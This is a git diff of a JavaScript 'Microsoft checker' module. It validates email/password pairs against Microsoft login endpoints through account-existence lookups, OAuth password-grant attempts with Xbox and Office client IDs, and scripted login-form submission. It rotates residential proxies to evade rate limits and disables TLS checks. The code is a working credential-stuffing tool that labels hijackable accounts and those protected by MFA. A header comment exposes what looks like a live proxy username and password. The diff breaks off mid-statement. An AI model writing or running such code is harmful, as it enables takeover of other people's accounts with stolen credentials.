@@ -1,16 +1,13 @@
 /**
- * Microsoft checker with optional proxy (required for reliable password checks on Render).
+ * Microsoft checker — SOAX / residential proxy friendly
  *
- * Env:
+ * Env (pick one):
  *   MS_CHECK_PROXY=http://user:pass@host:port
- *   HTTPS_PROXY / HTTP_PROXY also work
- *   PASS_WORKER_URL=https://selenium-worker  (best)
+ *   MS_CHECK_PROXY=socks5://user:pass@host:port
+ *   MS_CHECK_PROXIES=host:port:user:pass,host2:port2:user:pass
  *
- * Messages:
- *   This Email doesn't exist
- *   Not loginable
- *   password was changed by original user
- *   Login OK
+ * SOAX example:
+ *   MS_CHECK_PROXY=http://network-res_mob:mhfLveDKfR@proxy.soax.com:1337
  */
 const MSG = {
   NO_EMAIL: "This Email doesn't exist",
@@ -22,147 +19,227 @@ const MSG = {
 const UA =
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
 
-let _proxyReady = false;
-let _proxyList = []; // full proxy URLs
-let _proxyIndex = 0;
-let _socksAgent = null;
-let _httpDispatcher = null;
-let _activeProxy = '';
+let _ready = false;
+let _list = [];
+let _idx = 0;
+let _agent = null; // socks agent
+let _dispatcher = null; // undici
+let _active = '';
+let _mode = 'direct';
 
-function parseProxyLine(line) {
+function safe(u) {
+  return String(u || '').replace(/\/\/([^/@]+)@/, '//***:***@');
+}
+
+function parseLine(line) {
   line = String(line || '').trim();
   if (!line) return null;
-  if (/^socks/i.test(line) || /^https?:\/\//i.test(line)) return line;
-  // host:port:user:pass
-  const parts = line.split(':');
-  if (parts.length >= 4) {
-    const host = parts[0];
-    const port = parts[1];
-    const user = parts[2];
-    const pass = parts.slice(3).join(':'); // password may contain :
-    return 'http://' + encodeURIComponent(user) + ':' + encodeURIComponent(pass) + '@' + host + ':' + port;
+  if (/^(socks5h?|socks4|https?):\/\//i.test(line)) return line;
+
+  // user:pass@host:port  (SOAX style without scheme)
+  const at = line.lastIndexOf('@');
+  if (at > 0) {
+    const auth = line.slice(0, at);
+    const hostport = line.slice(at + 1);
+    const ci = auth.indexOf(':');
+    if (ci > 0 && hostport.includes(':')) {
+      const user = auth.slice(0, ci);
+      const pass = auth.slice(ci + 1);
+      return (
+        'http://' +
+        encodeURIComponent(user) +
+        ':' +
+        encodeURIComponent(pass) +
+        '@' +
+        hostport
+      );
+    }
   }
-  if (parts.length === 2) return 'http://' + parts[0] + ':' + parts[1];
+
+  // host:port:user:pass
+  const p = line.split(':');
+  if (p.length >= 4) {
+    const host = p[0];
+    const port = p[1];
+    const user = p[2];
+    const pass = p.slice(3).join(':');
+    return (
+      'http://' +
+      encodeURIComponent(user) +
+      ':' +
+      encodeURIComponent(pass) +
+      '@' +
+      host +
+      ':' +
+      port
+    );
+  }
   return null;
 }
 
-function loadProxyList() {
-  const raw =
-    process.env.MS_CHECK_PROXIES ||
-    process.env.MS_CHECK_PROXY ||
-    process.env.HTTPS_PROXY ||
-    process.env.HTTP_PROXY ||
-    '';
-  const lines = String(raw)
+function loadList() {
+  const raw = [process.env.MS_CHECK_PROXY, process.env.MS_CHECK_PROXIES, process.env.HTTPS_PROXY]
+    .filter(Boolean)
+    .join(',');
+  return String(raw)
     .split(/[\n,;]+/)
-    .map((s) => s.trim())
+    .map((s) => parseLine(s.trim()))
     .filter(Boolean);
-  const list = [];
-  for (const line of lines) {
-    const u = parseProxyLine(line);
-    if (u) list.push(u);
-  }
-  return list;
 }
 
-function safeProxy(url) {
-  return String(url || '').replace(/\/\/.*:.*@/, '//***:***@');
-}
-
-function initProxy() {
-  if (_proxyReady) return;
-  _proxyReady = true;
-  _proxyList = loadProxyList();
-  if (!_proxyList.length) {
-    console.log('[msCheck] No proxy set (MS_CHECK_PROXIES / MS_CHECK_PROXY)');
+function init() {
+  if (_ready) return;
+  _ready = true;
+  _list = loadList();
+  if (!_list.length) {
+    console.log('[msCheck] No MS_CHECK_PROXY set');
     return;
   }
-  console.log('[msCheck] Loaded', _proxyList.length, 'proxies');
-  selectProxy(0);
+  console.log('[msCheck] proxies:', _list.length);
+  use(0);
 }
 
-function selectProxy(index) {
-  if (!_proxyList.length) return;
-  _proxyIndex = index % _proxyList.length;
-  _activeProxy = _proxyList[_proxyIndex];
-  _socksAgent = null;
-  _httpDispatcher = null;
-
-  const isSocks = /^socks/i.test(_activeProxy);
-  if (isSocks) {
+function use(i) {
+  if (!_list.length) return;
+  _idx = i % _list.length;
+  _active = _list[_idx];
+  _agent = null;
+  _dispatcher = null;
+  const socks = /^socks/i.test(_active);
+  if (socks) {
     try {
       const { SocksProxyAgent } = require('socks-proxy-agent');
-      _socksAgent = new SocksProxyAgent(_activeProxy);
-      console.log('[msCheck] SOCKS', _proxyIndex + 1 + '/' + _proxyList.length, safeProxy(_activeProxy));
+      _agent = new SocksProxyAgent(_active);
+      _mode = 'socks';
+      console.log('[msCheck] SOCKS', _idx + 1, safe(_active));
     } catch (e) {
-      console.error('[msCheck] socks-proxy-agent error:', e.message);
+      console.error('[msCheck] socks fail', e.message);
+      _mode = 'error';
     }
     return;
   }
   try {
     const undici = require('undici');
-    _httpDispatcher = new undici.ProxyAgent(_activeProxy);
-    console.log('[msCheck] HTTP', _proxyIndex + 1 + '/' + _proxyList.length, safeProxy(_activeProxy));
+    _dispatcher = new undici.ProxyAgent({
+      uri: _active,
+      requestTls: { rejectUnauthorized: false }
+    });
+    _mode = 'http';
+    console.log('[msCheck] HTTP', _idx + 1, safe(_active));
   } catch (e) {
-    console.error('[msCheck] HTTP proxy error:', e.message);
+    console.error('[msCheck] http proxy fail', e.message);
+    _mode = 'error';
   }
 }
 
-function rotateProxy() {
-  if (_proxyList.length < 2) return false;
-  selectProxy(_proxyIndex + 1);
+function rotate() {
+  if (_list.length < 2) return false;
+  use(_idx + 1);
   return true;
 }
 
-function headersToObject(headers) {
-  const out = { 'User-Agent': UA };
-  if (!headers) return out;
-  if (typeof headers.forEach === 'function') {
-    headers.forEach((v, k) => {
-      out[k] = v;
+function hdr(h) {
+  const o = { 'User-Agent': UA, Accept: '*/*' };
+  if (!h) return o;
+  if (typeof h.forEach === 'function') h.forEach((v, k) => (o[k] = v));
+  else Object.assign(o, h);
+  return o;
+}
+
+function socksReq(urlStr, method, headers, body) {
+  const http = require('http');
+  const https = require('https');
+  const { URL } = require('url');
+  const u = new URL(urlStr);
+  const lib = u.protocol === 'https:' ? https : http;
+  const payload = body == null ? null : Buffer.from(String(body), 'utf8');
+  const headers2 = Object.assign({}, headers);
+  if (payload) headers2['Content-Length'] = String(payload.length);
+
+  return new Promise((resolve, reject) => {
+    const req = lib.request(
+      {
+        hostname: u.hostname,
+        port: u.port || (u.protocol === 'https:' ? 443 : 80),
+        path: u.pathname + u.search,
+        method,
+        headers: headers2,
+        agent: _agent,
+        timeout: 60000,
+        rejectUnauthorized: false
+      },
+      (inc) => {
+        const chunks = [];
+        inc.on('data', (c) => chunks.push(c));
+        inc.on('end', () => {
+          const buf = Buffer.concat(chunks);
+          const rh = inc.headers || {};
+          resolve({
+            ok: inc.statusCode >= 200 && inc.statusCode < 300,
+            status: inc.statusCode,
+            headers: {
+              get: (n) => {
+                const v = rh[String(n).toLowerCase()];
+                return Array.isArray(v) ? v[0] : v || null;
+              },
+              getSetCookie: () => {
+                const sc = rh['set-cookie'];
+                return !sc ? [] : Array.isArray(sc) ? sc : [sc];
+              }
+            },
+            text: async () => buf.toString('utf8'),
+            json: async () => JSON.parse(buf.toString('utf8') || '{}')
+          });
+        });
+      }
+    );
+    req.on('error', reject);
+    req.on('timeout', () => {
+      req.destroy();
+      reject(new Error('proxy timeout'));
     });
-  } else {
-    Object.assign(out, headers);
-  }
-  return out;
+    if (payload) req.write(payload);
+    req.end();
+  });
 }
 
 async function msFetch(url, opts = {}) {
-  initProxy();
-  const method = (opts.method || 'GET').toUpperCase();
-  const headers = headersToObject(opts.headers);
-  const body = opts.body;
+  init();
+  let method = (opts.method || 'GET').toUpperCase();
+  let body = opts.body;
+  const headers = hdr(opts.headers);
   const redirect = opts.redirect || 'follow';
   let current = url;
-  let hops = 0;
-  let useMethod = method;
-  let useBody = body;
 
-  while (hops < 8) {
-    hops++;
+  for (let hop = 0; hop < 8; hop++) {
     let res;
-    if (_socksAgent) {
-      res = await socksRequest(current, useMethod, headers, useBody);
-    } else if (_httpDispatcher) {
-      const undici = require('undici');
-      res = await undici.fetch(current, {
-        method: useMethod,
-        headers,
-        body: useBody,
-        redirect: 'manual',
-        dispatcher: _httpDispatcher
-      });
-    } else {
-      res = await fetch(current, { method: useMethod, headers, body: useBody, redirect: 'manual' });
+    try {
+      if (_agent) {
+        res = await socksReq(current, method, headers, body);
+      } else if (_dispatcher) {
+        const undici = require('undici');
+        res = await undici.fetch(current, {
+          method,
+          headers,
+          body,
+          redirect: 'manual',
+          dispatcher: _dispatcher
+        });
+      } else {
+        res = await fetch(current, { method, headers, body, redirect: 'manual' });
+      }
+    } catch (e) {
+      const err = new Error('Proxy/network: ' + e.message);
+      err.cause = e;
+      throw err;
     }
 
-    const status = res.status;
     const loc = res.headers.get('location');
-    if (redirect === 'follow' && status >= 300 && status < 400 && loc) {
+    if (redirect === 'follow' && res.status >= 300 && res.status < 400 && loc) {
       current = new URL(loc, current).toString();
-      if (status !== 307 && status !== 308) {
-        useMethod = 'GET';
-        useBody = undefined;
+      if (res.status !== 307 && res.status !== 308) {
+        method = 'GET';
+        body = undefined;
       }
       continue;
     }
@@ -171,114 +248,24 @@ async function msFetch(url, opts = {}) {
   throw new Error('Too many redirects');
 }
 
-function socksRequest(urlStr, method, headers, body) {
-  const http = require('http');
-  const https = require('https');
-  const { URL } = require('url');
-  const u = new URL(urlStr);
-  const isHttps = u.protocol === 'https:';
-  const lib = isHttps ? https : http;
-  const payload = body == null ? null : Buffer.from(String(body), 'utf8');
-  const hdrs = Object.assign({}, headers);
-  if (payload && !hdrs['Content-Length'] && !hdrs['content-length']) {
-    hdrs['Content-Length'] = String(payload.length);
-  }
-  return new Promise((resolve, reject) => {
-    const req = lib.request(
-      {
-        hostname: u.hostname,
-        port: u.port || (isHttps ? 443 : 80),
-        path: u.pathname + u.search,
-        method,
-        headers: hdrs,
-        agent: _socksAgent,
-        timeout: 45000
-      },
-      (inc) => {
-        const chunks = [];
-        inc.on('data', (c) => chunks.push(c));
-        inc.on('end', () => {
-          const buf = Buffer.concat(chunks);
-          const rawHeaders = inc.headers || {};
-          resolve({
-            ok: inc.statusCode >= 200 && inc.statusCode < 300,
-            status: inc.statusCode,
-            headers: {
-              get(name) {
-                const v = rawHeaders[String(name).toLowerCase()];
-                return Array.isArray(v) ? v[0] : v || null;
-              },
-              getSetCookie() {
-                const sc = rawHeaders['set-cookie'];
-                if (!sc) return [];
-                return Array.isArray(sc) ? sc : [sc];
-              }
-            },
-            async text() {
-              return buf.toString('utf8');
-            },
-            async json() {
-              return JSON.parse(buf.toString('utf8') || '{}');
-            }
-          });
-        });
-      }
-    );
-    req.on('error', reject);
-    req.on('timeout', () => {
-      req.destroy();
-      reject(new Error('SOCKS proxy timeout'));
-    });
-    if (payload) req.write(payload);
-    req.end();
-  });
-}
-
-function cleanEmail(e) {
-  return String(e || '').trim().toLowerCase();
-}
-
-function pickCookies(res) {
+async function probeProxy() {
+  init();
+  if (!_list.length) return { ok: false, error: 'No MS_CHECK_PROXY set' };
   try {
-    if (typeof res.headers.getSetCookie === 'function') {
-      const arr = res.headers.getSetCookie();
-      if (arr && arr.length) return arr.map((c) => c.split(';')[0]).join('; ');
-    }
-  } catch (_) {}
-  const sc = res.headers.get('set-cookie');
-  if (!sc) return '';
-  return sc
-    .split(/,(?=\s*[^;=]+=)/)
-    .map((c) => c.split(';')[0].trim())
-    .join('; ');
-}
-
-function mergeCookie(a, b) {
-  const map = {};
-  for (const src of [a, b]) {
-    String(src || '')
-      .split(';')
-      .map((s) => s.trim())
-      .filter(Boolean)
-      .forEach((p) => {
-        const i = p.indexOf('=');
-        if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
-      });
+    const res = await msFetch('https://api.ipify.org?format=json', { redirect: 'follow' });
+    const data = await res.json().catch(() => ({}));
+    return { ok: res.status === 200, ip: data.ip, status: res.status, proxy: safe(_active), mode: _mode };
+  } catch (e) {
+    return { ok: false, error: e.message, proxy: safe(_active), mode: _mode };
   }
-  return Object.entries(map)
-    .map(([k, v]) => k + '=' + v)
-    .join('; ');
 }
 
-
-/** Existence check without proxy (works more often on free tier) */
-async function getCredentialTypeDirect(email) {
-  const res = await fetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
+async function getCredentialType(email) {
+  const res = await msFetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json; charset=utf-8',
       Accept: 'application/json',
-      'User-Agent': UA,
       Origin: 'https://login.live.com',
       Referer: 'https://login.live.com/'
     },
@@ -303,72 +290,26 @@ async function getCredentialTypeDirect(email) {
   return { data, http: res.status };
 }
 
-async function getCredentialType(email) {
-  let cookies = '';
-  try {
-    const warm = await msFetch('https://login.live.com/login.srf?wa=wsignin1.0&mkt=EN-US&id=292841', {
-      headers: { Accept: 'text/html' },
-      redirect: 'follow'
-    });
-    cookies = pickCookies(warm);
-  } catch (_) {}
-
-  const res = await msFetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json; charset=utf-8',
-      Accept: 'application/json',
-      Cookie: cookies,
-      Origin: 'https://login.live.com',
-      Referer: 'https://login.live.com/'
-    },
-    body: JSON.stringify({
-      username: email,
-      uaid: '',
-      isOtherIdpSupported: true,
-      checkPhones: false,
-      isRemoteNGCSupported: true,
-      isCookieBannerShown: false,
-      isFidoSupported: true,
-      forceotclogin: false,
-      otclogindisallowed: false,
-      isExternalFederationDisallowed: false,
-      isRemoteConnectSupported: false,
-      federationFlags: 0,
-      isSignup: false,
-      flowToken: ''
-    })
-  });
-  const data = await res.json().catch(() => null);
-  cookies = mergeCookie(cookies, pickCookies(res));
-  return { data, cookies, http: res.status };
-}
-
-function fromCredentialType(data) {
+function fromCT(data) {
   if (!data || typeof data !== 'object') return { known: false };
   const code = data.IfExistsResult;
-  if (code === 1 || code === 4) {
-    return { known: true, exists: false, msg: MSG.NO_EMAIL };
-  }
-  if (code !== 0 && code !== 2 && code !== 5 && code !== 6) {
-    return { known: false, code };
-  }
+  if (code === 1 || code === 4) return { known: true, exists: false, msg: MSG.NO_EMAIL };
+  if (![0, 2, 5, 6].includes(code)) return { known: false, code };
   const creds = data.Credentials || {};
-  if (creds.FederationRedirectUrl && creds.HasPassword === false) {
+  if (creds.HasPassword === false) {
     return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
   }
-  if (creds.HasPassword === false) {
+  if (creds.FederationRedirectUrl && creds.HasPassword === false) {
     return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
   }
   return {
     known: true,
     exists: true,
-    hasPassword: creds.HasPassword === true || creds.HasPassword === undefined,
-    preferOther: creds.PrefCredential != null && creds.PrefCredential !== 0
+    hasPassword: creds.HasPassword === true || creds.HasPassword === undefined
   };
 }
 
-function mapOauthData(data, http) {
+function mapOauth(data, http) {
   if (http === 200 && (data.access_token || data.refresh_token)) {
     return { definitive: true, ok: true, msg: MSG.OK };
   }
@@ -376,25 +317,22 @@ function mapOauthData(data, http) {
   const desc = String(data.error_description || data.error_message || data.message || data.error || '');
   const blob = (codes.join(' ') + ' ' + desc).toLowerCase();
 
-  if (codes.includes('50034') || /aadsts50034|user account does not exist|user not found/i.test(blob)) {
+  if (codes.includes('50034') || /aadsts50034|does not exist|user not found/i.test(blob)) {
     return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
   }
-  if (
-    codes.includes('50126') ||
-    /aadsts50126|invalid username or password|password is incorrect/i.test(blob)
-  ) {
+  if (codes.includes('50126') || /aadsts50126|invalid username or password|password is incorrect/i.test(blob)) {
     return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
   }
   if (
-    codes.some((c) => ['50076', '50079', '50072', '50158', '50140', '53003', '53004', '50097'].includes(c)) ||
-    /aadsts50076|aadsts50079|multi-factor|mfa required|strong authentication|proofup/i.test(blob)
+    codes.some((c) => ['50076', '50079', '50072', '50158', '50140', '53003'].includes(c)) ||
+    /aadsts50076|multi-factor|mfa required|strong authentication/i.test(blob)
   ) {
     return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
   }
-  if (codes.some((c) => ['50057', '50005', '50053'].includes(c)) || /account is locked|disabled/i.test(blob)) {
+  if (codes.some((c) => ['50057', '50005', '50053'].includes(c))) {
     return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
   }
-  return { definitive: false, raw: desc.slice(0, 200) };
+  return { definitive: false, raw: desc.slice(0, 180) };
 }
 
 async function oauthTry(email, password, clientId, tokenUrl, scope) {
@@ -402,44 +340,32 @@ async function oauthTry(email, password, clientId, tokenUrl, scope) {
     grant_type: 'password',
     client_id: clientId,
     username: email,
-    password: password,
-    scope: scope
+    password,
+    scope
   });
   if (tokenUrl.includes('login.live.com')) {
     body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
   }
   const res = await msFetch(tokenUrl, {
     method: 'POST',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded',
-      Accept: 'application/json'
-    },
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded', Accept: 'application/json' },
     body: body.toString()
   });
   const data = await res.json().catch(() => ({}));
-  return mapOauthData(data, res.status);
+  return mapOauth(data, res.status);
 }
 
-/** Full HTML password login (works through residential proxy) */
-async function htmlPasswordCheck(email, password, seedCookies) {
+async function htmlPasswordCheck(email, password) {
   const loginUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&mkt=en-US&id=292841';
   const pageRes = await msFetch(loginUrl, {
-    headers: {
-      Accept: 'text/html',
-      Cookie: seedCookies || '',
-      'Accept-Language': 'en-US,en;q=0.9'
-    },
+    headers: { Accept: 'text/html', 'Accept-Language': 'en-US,en;q=0.9' },
     redirect: 'follow'
   });
   const html = await pageRes.text();
-  let cookies = mergeCookie(seedCookies, pickCookies(pageRes));
-
   const ppft =
     (html.match(/name="PPFT"[^>]*value="([^"]+)"/i) || [])[1] ||
     (html.match(/"sFT":"([^"]+)"/i) || [])[1] ||
-    (html.match(/sFT:'([^']+)'/i) || [])[1] ||
     '';
-
   let urlPost =
     (html.match(/urlPost:"([^"]+)"/i) || [])[1] ||
     (html.match(/urlPost:'([^']+)'/i) || [])[1] ||
@@ -467,51 +393,36 @@ async function htmlPasswordCheck(email, password, seedCookies) {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
-      Cookie: cookies,
       Origin: 'https://login.live.com',
       Referer: loginUrl
     },
     body: form.toString(),
     redirect: 'manual'
   });
-
   const loc = postRes.headers.get('location') || '';
   const body = await postRes.text().catch(() => '');
   const all = (body + '\n' + loc).toLowerCase();
 
-  if (/account\.microsoft\.com|office\.com|onedrive|completesignin|oauth20/i.test(loc)) {
-    if (/proof|identity|otp|securitycode|interrupt/i.test(loc + body)) {
+  if (/account\.microsoft\.com|office\.com|onedrive|completesignin/i.test(loc)) {
+    if (/proof|identity|otp|interrupt/i.test(loc + body)) {
       return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
     }
     return { definitive: true, ok: true, msg: MSG.OK };
   }
-  if (/password is incorrect|account or password is incorrect|serrorcode["\s:]*["']?80041012/i.test(all)) {
+  if (/password is incorrect|account or password is incorrect/i.test(all)) {
     return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
   }
-  if (/that microsoft account doesn'?t exist|we couldn'?t find an account/i.test(all)) {
+  if (/doesn'?t exist|couldn'?t find an account/i.test(all)) {
     return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
   }
-  // Other ways page: if password was offered and failed, or only code
-  if (/other ways to sign in|sign in another way|use a code|authenticator|verify your identity/i.test(all)) {
-    if (/name="passwd"|type="password"/i.test(body)) {
-      // password form still there — treat incorrect as pass changed if error text
-      const err = (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] || '';
-      if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
-      // Has password field under other ways → try was done; no clear error
-      return { definitive: false, reason: 'other_ways_with_password_field' };
+  if (/other ways to sign in|use a code|authenticator|verify your identity/i.test(all)) {
+    if (/name="passwd"/i.test(body) && /incorrect/i.test(all)) {
+      return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
     }
-    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
+    if (!/name="passwd"/i.test(body)) {
+      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
+    }
   }
-
-  if (postRes.status === 200 && /name="passwd"/i.test(body)) {
-    const err =
-      (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] ||
-      (body.match(/id="usernameError"[^>]*>([^<]+)</i) || [])[1] ||
-      '';
-    if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED, raw: err };
-    if (/doesn'?t exist|couldn'?t find/i.test(err)) return { definitive: true, ok: false, msg: MSG.NO_EMAIL, raw: err };
-  }
-
   return { definitive: false, reason: 'html_inconclusive', http: postRes.status };
 }
 
@@ -532,10 +443,8 @@ async function tryWorker(email, password) {
 
 function mapWorker(data) {
   if (!data) return null;
-  if (data.ok === true || data.status === 'success') {
-    return { ok: true, summary: MSG.OK, error: null };
-  }
-  const err = String(data.error || data.message || data.result || '').toLowerCase();
+  if (data.ok === true || data.status === 'success') return { ok: true, summary: MSG.OK, error: null };
+  const err = String(data.error || data.message || '').toLowerCase();
   if (!err) return null;
   if (/50034|not exist|doesn'?t exist|no account/.test(err)) {
     return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
@@ -543,17 +452,19 @@ function mapWorker(data) {
   if (/50126|incorrect|wrong password|invalid username or password/.test(err)) {
     return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
   }
-  if (/50076|50079|mfa|2fa|authenticator|not loginable|no password|otp/.test(err)) {
+  if (/50076|mfa|2fa|not loginable|no password|otp/.test(err)) {
     return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
   }
   return null;
 }
 
 async function checkMicrosoft(email, password) {
-  initProxy();
-  email = cleanEmail(email);
+  init();
+  email = String(email || '')
+    .trim()
+    .toLowerCase();
   password = String(password || '');
-  const details = { proxies: _proxyList.length, steps: [] };
+  const details = { steps: [], proxyCount: _list.length };
 
   if (!email.includes('@')) {
     return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
@@ -562,125 +473,103 @@ async function checkMicrosoft(email, password) {
     return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
   }
 
-  const worker = await tryWorker(email, password);
-  if (worker) {
-    details.worker = worker;
-    const m = mapWorker(worker);
-    if (m) return { ...m, details };
-  }
+  // 1) Proxy connectivity test first
+  const probe = await probeProxy();
+  details.probe = probe;
+  details.steps.push(probe.ok ? 'proxy IP ' + probe.ip : 'proxy fail: ' + (probe.error || probe.status));
 
-  // Free: try GetCredentialType direct (no proxy) — existence often works from Render
-  try {
-    const directCt = await getCredentialTypeDirect(email);
-    details.directCt = directCt.data;
-    const info = fromCredentialType(directCt.data);
-    details.exists = info;
-    details.steps.push('direct-ct');
-    if (info.known && info.exists === false) {
-      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
-    }
-    if (info.msg === MSG.NOT_LOGINABLE && info.hasPassword === false) {
-      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
-    }
-  } catch (e) {
-    details.directCtError = e.message;
-  }
-
-  const maxRounds = Math.max(1, _proxyList.length || 1);
-  let lastUnknown = null;
-
-  for (let round = 0; round < maxRounds; round++) {
-    if (round > 0) rotateProxy();
-    details.proxyUsed = safeProxy(_activeProxy || 'direct');
-    details.steps.push('round ' + (round + 1) + ' ' + details.proxyUsed);
-
-    let ctInfo = { known: false };
-    let cookies = '';
-    try {
-      const ct = await getCredentialType(email);
-      details.credentialType = ct.data;
-      cookies = ct.cookies || '';
-      ctInfo = fromCredentialType(ct.data);
-      details.exists = ctInfo;
-      if (ctInfo.known && ctInfo.exists === false) {
-        return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+  if (_list.length && !probe.ok) {
+    // try rotate once if multi
+    if (rotate()) {
+      const probe2 = await probeProxy();
+      details.probe2 = probe2;
+      if (!probe2.ok) {
+        const msg =
+          'Proxy not working: ' +
+          (probe2.error || probe.error || 'auth/connect failed') +
+          '\nCheck MS_CHECK_PROXY user/pass/host. SOAX HTTP format:\n' +
+          'http://USER:PASS@proxy.soax.com:1337';
+        return { ok: false, summary: msg, error: msg, details };
       }
-      if (ctInfo.msg === MSG.NOT_LOGINABLE && ctInfo.hasPassword === false) {
-        return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
-      }
-    } catch (e) {
-      details.ctError = e.message;
-      details.steps.push('ct fail: ' + e.message);
-      continue; // try next proxy
-    }
-
-    const clients = [
-      ['000000004C12AE6F', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
-      ['00000000402b5328', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
-      ['1f907974-e22b-4810-a9de-d282292ec59c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access'],
-      ['d3590ed6-52b3-4102-aeff-aad2292ab01c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access']
-    ];
-    let definitive = null;
-    for (const [id, url, scope] of clients) {
-      try {
-        const r = await oauthTry(email, password, id, url, scope);
-        details.steps.push({ oauth: id, def: r.definitive, msg: r.msg });
-        if (r.definitive) {
-          definitive = r;
-          break;
-        }
-      } catch (e) {
-        details.steps.push({ oauth: id, err: e.message });
-      }
-    }
-    if (definitive) {
-      return {
-        ok: !!definitive.ok,
-        summary: definitive.msg,
-        error: definitive.ok ? null : definitive.msg,
-        details
-      };
-    }
-
-    try {
-      const html = await htmlPasswordCheck(email, password, cookies);
-      details.html = html;
-      if (html.definitive) {
-        return { ok: !!html.ok, summary: html.msg, error: html.ok ? null : html.msg, details };
-      }
-    } catch (e) {
-      details.htmlError = e.message;
-      details.steps.push('html fail: ' + e.message);
-    }
-
-    if (ctInfo.known && ctInfo.exists && ctInfo.hasPassword === false) {
-      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
-    }
-
-    lastUnknown = details.proxyUsed;
-  }
-
-  // Free path: still return useful existence info when we have it
-  if (details.exists && details.exists.known) {
-    if (details.exists.exists === false) {
-      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
-    }
-    if (details.exists.hasPassword === false) {
-      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
-    }
-    if (details.exists.exists === true) {
+    } else {
       const msg =
-        'Account exists — password could not be verified on free/datacenter IPs. ' +
-        'Use a residential proxy or PASS_WORKER_URL for full password check.';
+        'Proxy not working: ' +
+        (probe.error || 'connect failed') +
+        '\nVerify SOAX is active and env is:\nMS_CHECK_PROXY=http://network-res_mob:PASSWORD@proxy.soax.com:1337';
       return { ok: false, summary: msg, error: msg, details };
     }
   }
 
-  const tip =
-    'Could not reach Microsoft login from free proxies. ' +
-    'Email existence also unknown. Try again later or use residential / worker.';
-  return { ok: false, summary: tip, error: tip, details: { ...details, lastUnknown } };
+  const worker = await tryWorker(email, password);
+  if (worker) {
+    const m = mapWorker(worker);
+    if (m) return { ...m, details };
+  }
+
+  const rounds = Math.max(1, _list.length || 1);
+  for (let r = 0; r < rounds; r++) {
+    if (r > 0) rotate();
+    details.proxy = safe(_active || 'direct');
+    details.steps.push('round ' + (r + 1));
+
+    try {
+      const ct = await getCredentialType(email);
+      details.ct = ct.data;
+      const info = fromCT(ct.data);
+      details.exists = info;
+      if (info.known && info.exists === false) {
+        return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
+      }
+      if (info.msg === MSG.NOT_LOGINABLE) {
+        return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
+      }
+    } catch (e) {
+      details.steps.push('ct err ' + e.message);
+    }
+
+    for (const [id, url, scope] of [
+      ['000000004C12AE6F', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
+      ['00000000402b5328', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
+      [
+        '1f907974-e22b-4810-a9de-d282292ec59c',
+        'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
+        'openid offline_access'
+      ]
+    ]) {
+      try {
+        const o = await oauthTry(email, password, id, url, scope);
+        if (o.definitive) {
+          return { ok: !!o.ok, summary: o.msg, error: o.ok ? null : o.msg, details };
+        }
+      } catch (e) {
+        details.steps.push('oauth ' + e.message);
+      }
+    }
+
+    try {
+      const h = await htmlPasswordCheck(email, password);
+      details.html = h;
+      if (h.definitive) {
+        return { ok: !!h.ok, summary: h.msg, error: h.ok ? null : h.msg, details };
+      }
+    } catch (e) {
+      details.steps.push('html ' + e.message);
+    }
+  }
+
+  if (details.exists && details.exists.exists === true) {
+    const msg =
